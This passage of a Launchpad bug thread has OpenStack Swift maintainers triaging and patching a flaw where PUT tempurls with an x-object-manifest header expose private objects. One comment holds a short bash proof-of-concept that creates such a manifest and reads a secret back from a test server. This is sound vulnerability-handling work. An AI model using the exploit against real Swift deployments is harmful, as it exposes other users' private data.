            <time itemprop="commentTime" datetime="2015-05-11T20:25:31.077753+00:00" title="2015-05-11 20:25:31 UTC">on 2015-05-11</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4395824/+files/put-tempurl-dlo-leak.patch">show how to use any PUT tempurl to probe for object/container existance</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4395824">Edit</a>
        (2.1 KiB,
        text/x-diff)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2015-05-12 01:09:31 UTC" datetime="2015-05-12T01:09:31.005920+00:00">on 2015-05-12</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Confirmed
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Medium
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-05-14T13:55:28.812523+00:00" title="2015-05-14 13:55:28 UTC">on 2015-05-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I have a feeling this might be a significant enough behavior change (breaking a workflow which application developers might already have encoded into their software) that we wouldn&#x27;t be able to safely backport it without having it as an optional mitigation that defaults to the original behavior. Then deployers can choose explicitly to disallow PUT DLO&#x27;s via tempurl in their environments without forcing it on all deployments consuming stable branches.</p>
<p>If we do end up making it configurable and leave the original behavior as the default, then this is territory for documenting in a security note not an advisory.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I have a feeling this might be a significant enough behavior change (breaking a workflow which application developers might already have encoded into their software) that we wouldn't be able to safely backport it without having it as an optional mitigation that defaults to the original behavior. Then deployers can choose explicitly to disallow PUT DLO's via tempurl in their environments without forcing it on all deployments consuming stable branches.

If we do end up making it configurable and leave the original behavior as the default, then this is territory for documenting in a security note not an advisory.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Incomplete
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-06-10T19:03:23.644493+00:00" title="2015-06-10 19:03:23 UTC">on 2015-06-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Can someone triage the swift bug ?</p>
<p>This looks like a type B* bug ( <a rel="nofollow" href="https://security.openstack.org/vmt-process.html#incident-report-taxonomy">https:/<wbr />/security.<wbr />openstack.<wbr />org/vmt-<wbr />process.<wbr />html#incident-<wbr />report-<wbr />taxonomy</a> ).<br />
Unless someone object, we&#x27;ll subscribe ossg-coresec next Monday.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Can someone triage the swift bug ?

This looks like a type B* bug ( https://security.openstack.org/vmt-process.html#incident-report-taxonomy ).
Unless someone object, we'll subscribe ossg-coresec next Monday.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-06-12T23:53:43.789314+00:00" title="2015-06-12 23:53:43 UTC">on 2015-06-12</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Tristan, this bug and <a rel="nofollow" href="https://bugs.launchpad.net/swift/+bug/1449212">https:/<wbr />/bugs.launchpad<wbr />.net/swift/<wbr />+bug/1449212</a> are closely related and should only be disclosed at the same time.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1449212 are closely related and should only be disclosed at the same time.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in swift: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-06-12T23:57:09.072604+00:00" title="2015-06-12 23:57:09 UTC">on 2015-06-12</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m not sure if this is a class B1 or class A bug yet. I definitely think this needs to be fixed on master. If we do end up blocking DLOs with tempurls (or at least creating DLOs with tempurls), then we need to decide if it&#x27;s better to leave old versions vulnerable or change their behavior with a security update. My default response is to fix the bug and backport it.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm not sure if this is a class B1 or class A bug yet. I definitely think this needs to be fixed on master. If we do end up blocking DLOs with tempurls (or at least creating DLOs with tempurls), then we need to decide if it's better to leave old versions vulnerable or change their behavior with a security update. My default response is to fix the bug and backport it.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-06-15T17:08:25.130404+00:00" title="2015-06-15 17:08:25 UTC">on 2015-06-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Alright, so if it&#x27;s a class A, then we could update the impact description of <a href="/bugs/1449212" class="bug-link">bug 1449212</a> to cover both bug within the same advisory.</p>
<p>Else, then let&#x27;s get OSSG on board for this one to work on a security note.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Alright, so if it's a class A, then we could update the impact description of bug 1449212 to cover both bug within the same advisory.

Else, then let's get OSSG on board for this one to work on a security note.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~clay-gerrard" class="sprite person">clayg (clay-gerrard)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-06-23T02:33:08.262828+00:00" title="2015-06-23 02:33:08 UTC">on 2015-06-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4418957/+files/fix-tempurl-dlo-surprise.patch">400 PUT tempurls that have a x-object-manifest header</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4418957">Edit</a>
        (7.2 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>sorry, been busy - attached patch for review</p>
<p>Here&#x27;s some bash that works on a swift-all-in-one to get you started:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;#!/bin/bash<br />
&nbsp;&nbsp;&nbsp;&nbsp;# resetswift<br />
&nbsp;&nbsp;&nbsp;&nbsp;set -e<br />
&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;password&quot; &gt; secret<br />
&nbsp;&nbsp;&nbsp;&nbsp;swift upload private secret<br />
&nbsp;&nbsp;&nbsp;&nbsp;swift post -H &#x27;x-account-<wbr />meta-temp-<wbr />url-key: mykey&#x27;<br />
&nbsp;&nbsp;&nbsp;&nbsp;# create a container for people to upload stuff too<br />
&nbsp;&nbsp;&nbsp;&nbsp;swift post public<br />
&nbsp;&nbsp;&nbsp;&nbsp;# attacker: &quot;yes hello, can I have a safe place to upload some of my data?&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;PUT_<wbr />TEMPURL_<wbr />SIG=&quot;$(<wbr />swift tempurl PUT 60 /v1/AUTH_<wbr />test/public/<wbr />your-thing mykey)&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;curl -XPUT -H &#x27;x-object-manifest: private/secret&#x27; &quot;<a rel="nofollow" href="http://localhost:8080">http://<wbr />localhost:<wbr />8080</a>${PUT_TEMPURL_SIG}&quot; -d &#x27;&#x27;<br />
&nbsp;&nbsp;&nbsp;&nbsp;# attacker: &quot;oh yes, that data I just uploaded - can I download it please?&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;PUT_<wbr />TEMPURL_<wbr />SIG=&quot;$(<wbr />swift tempurl GET 60 /v1/AUTH_<wbr />test/public/<wbr />your-thing mykey)&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;# attacker: only... it&#x27;s not *MY* data - trolrolrololollolo<br />
&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />****&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;curl &quot;<a rel="nofollow" href="http://localhost:8080">http://<wbr />localhost:<wbr />8080</a>${PUT_TEMPURL_SIG}&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />****&quot;</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">sorry, been busy - attached patch for review

Here's some bash that works on a swift-all-in-one to get you started:

    #!/bin/bash
    # resetswift
    set -e
    echo "password" &gt; secret
    swift upload private secret
    swift post -H 'x-account-meta-temp-url-key: mykey'
    # create a container for people to upload stuff too
    swift post public
    # attacker: "yes hello, can I have a safe place to upload some of my data?"
    PUT_TEMPURL_SIG="$(swift tempurl PUT 60 /v1/AUTH_test/public/your-thing mykey)"
    curl -XPUT -H 'x-object-manifest: private/secret' "http://localhost:8080${PUT_TEMPURL_SIG}" -d ''
    # attacker: "oh yes, that data I just uploaded - can I download it please?"
    PUT_TEMPURL_SIG="$(swift tempurl GET 60 /v1/AUTH_test/public/your-thing mykey)"
    # attacker: only... it's not *MY* data - trolrolrololollolo
    echo ""
    echo "**************************************"
    curl "http://localhost:8080${PUT_TEMPURL_SIG}"
    echo ""
    echo "**************************************"

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~robert-clark" class="sprite person">Robert Clark (robert-clark)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-06T14:05:36.075580+00:00" title="2015-07-06 14:05:36 UTC">on 2015-07-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Looks like class A to me, not overly complicated to exploit given the right situation...</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Looks like class A to me, not overly complicated to exploit given the right situation...</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-22T18:29:05.388097+00:00" title="2015-07-22 18:29:05 UTC">on 2015-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Clay, the patch looks fine except that I can&#x27;t make the functests fail with patched or unpatched server code. I&#x27;m always getting a 201 for the object PUTs.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Clay, the patch looks fine except that I can't make the functests fail with patched or unpatched server code. I'm always getting a 201 for the object PUTs.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~clay-gerrard" class="sprite person">clayg (clay-gerrard)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-22T18:55:53.481407+00:00" title="2015-07-22 18:55:53 UTC">on 2015-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>ah I think I forgot some else: self.fail(&#x27;request did not error&#x27;) sorta lines in there - nice catch!  #willfix</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">ah I think I forgot some else: self.fail('request did not error') sorta lines in there - nice catch!  #willfix</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tsuyuzaki-kota" class="sprite person">Kota Tsuyuzaki (tsuyuzaki-kota)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-24T04:16:58.690594+00:00" title="2015-07-24 04:16:58 UTC">on 2015-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4433373/+files/fix-tempurl-for-clayg.diff">fix-tempurl-for-clayg.diff</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4433373">Edit</a>
        (7.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Clay</p>
<p>Here for you adding the self.fail to functional if manifest file upload succeeded.</p>
<p>Code looks good but just a question from me. Is this bug already defined as class A? If so, no problem to merge attached patch I guess.</p>
<p>However, if classified as B or so, I am wondering if we could take another option (or not? I&#x27;m not sure) that we can add &#x27;x-object-manifest&#x27; to incoming_<wbr />remove_<wbr />headers at tempurl config as default. The way I&#x27;m now suggesting here allows to put object with &#x27;x-object-manifest&#x27; header (will succeed as 201) but actually Swift will store the empty object w/o the header. The reason I talk about this is that currently Swift doesn&#x27;t block similar uploading case for *SLO*. Note that SLO doesn&#x27;t have security issue like this for  now because tempurl PUT seems to drop &quot;multipart-<wbr />manifest=<wbr />put&quot; query.  Therefore &quot;blocking as 400&quot; vs &quot;Allowing to store but modified silently like SLO&quot;.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Clay

Here for you adding the self.fail to functional if manifest file upload succeeded.

Code looks good but just a question from me. Is this bug already defined as class A? If so, no problem to merge attached patch I guess.

However, if classified as B or so, I am wondering if we could take another option (or not? I'm not sure) that we can add 'x-object-manifest' to incoming_remove_headers at tempurl config as default. The way I'm now suggesting here allows to put object with 'x-object-manifest' header (will succeed as 201) but actually Swift will store the empty object w/o the header. The reason I talk about this is that currently Swift doesn't block similar uploading case for *SLO*. Note that SLO doesn't have security issue like this for  now because tempurl PUT seems to drop "multipart-manifest=put" query.  Therefore "blocking as 400" vs "Allowing to store but modified silently like SLO".</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~clay-gerrard" class="sprite person">clayg (clay-gerrard)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-24T05:39:28.836349+00:00" title="2015-07-24 05:39:28 UTC">on 2015-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4433396/+files/fix-patch-for-kota.patch">fix-patch-for-kota.patch</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4433396">Edit</a>
        (7.4 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Kota I want the explicit error because if someone is trying to make a dlo via tempurl they are either</p>
<p>a) trying to validate this security hole and they will know they are patched/hozed by the 400</p>
